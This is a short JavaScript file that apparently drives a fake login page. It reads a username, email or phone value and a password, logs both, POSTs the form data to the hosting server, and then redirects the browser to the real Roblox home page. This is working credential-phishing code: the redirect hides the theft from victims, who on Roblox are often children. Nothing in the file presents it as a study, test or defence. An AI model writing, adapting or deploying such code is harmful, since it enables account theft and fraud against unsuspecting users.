const Form = document.querySelector("#details-form")

function GetDetails() {
    const UserNameOrEmailOrPhone = String(document.querySelector("#login-email").value)
    const Password = String(document.querySelector("#login-password").value)
    if (UserNameOrEmailOrPhone != "" && Password != "") {
        console.log("UserNameOrEmailOrPhone: " + UserNameOrEmailOrPhone)
        console.log("Password: " + Password)
        fetch("/", {
            method: "POST",
            body: JSON.stringify(Object.fromEntries(new FormData(Form))),
            headers: {
                "Content-Type" : "application/json",
            },
        })
        location.href = "https://www.roblox.com/home"
    }
}